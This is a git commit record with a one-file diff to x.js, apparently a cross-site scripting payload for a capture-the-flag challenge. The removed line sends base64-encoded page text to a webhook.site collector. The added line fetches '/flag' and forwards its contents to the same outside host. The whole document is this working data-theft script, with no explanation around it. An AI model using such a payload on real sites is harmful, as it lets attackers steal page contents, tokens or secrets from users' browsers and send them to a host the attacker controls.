6e1d55df39282ca9eefd1574d68ac8a8a5f23a51
aljzayryaltrath-hash <aljzayryaltrath@gmail.com>
2026-06-16 11:32:47 +0100

    Change fetch URL to use encoded flag data

--- x.js
+++ x.js
@@ -1,2 +1,1 @@
-
-fetch('https://webhook.site/f4209e86-ce3c-4e0c-aa91-31dbd14f2ad6?flag=' + btoa(document.body.innerText));
+fetch('/flag').then(r=>r.text()).then(d=>fetch('https://webhook.site/f4209e86-ce3c-4e0c-aa91-31dbd14f2ad6?flag='+encodeURIComponent(d)));
